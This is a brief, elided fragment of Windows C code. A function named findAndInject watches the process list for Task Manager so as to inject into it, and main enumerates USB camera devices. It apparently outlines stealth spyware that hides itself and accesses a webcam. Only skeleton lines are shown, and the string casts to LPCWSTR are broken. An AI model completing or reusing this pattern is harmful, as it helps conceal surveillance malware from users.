...
void findAndInject()
{
	...
	while (true) {
		...
		do
		{
			if (!lstrcmp(process.szExeFile, (LPCWSTR)"Taskmgr.exe") && lastpid != process.th32ProcessID) {
...
int main(int argc, char** argv) {
	...
	HDEVINFO DeviceInfoSet = SetupDiGetClassDevs(&GUID_DEVCLASS_CAMERA, (LPCWSTR)"USB", NULL, DIGCF_PRESENT);
